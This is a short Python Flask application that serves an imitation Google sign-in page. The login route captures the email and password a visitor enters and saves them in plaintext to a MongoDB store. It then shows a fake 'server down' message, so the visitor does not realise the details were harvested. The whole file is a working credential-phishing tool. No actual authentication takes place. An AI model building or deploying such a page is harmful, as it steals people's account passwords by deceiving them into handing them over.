from flask import Flask, render_template, request, redirect, url_for
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import DataRequired, Email
#from pymongo import MongoClient

from scripts.operationsAPIs import operationsAPI 
from scripts.mongoAPI import mongoAPI
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

# MongoDB Setup
# client = MongoClient("mongodb://localhost:27017/")
# db = client['loginDB_v3']
# users_collection = db['users']

# Form class for login
class GoogleLoginForm(FlaskForm):
    email = StringField('Email', validators=[DataRequired(), Email()])
    password = PasswordField('Password', validators=[DataRequired()])
    submit = SubmitField('Next')

@app.route('/', methods=['GET', 'POST'])
def login():
    form = GoogleLoginForm()
    if form.validate_on_submit():
        user_data = {
            'username': form.email.data,
            'password': form.password.data
        }
        mongoAPI.signup_user(user_data= user_data)
        return redirect(url_for('success'))
    return render_template('google_login.html', form=form)

@app.route('/success')
def success():
    return "<h6>server down try after some time</h6>"

if __name__ == '__main__':
    app.run(debug=True)
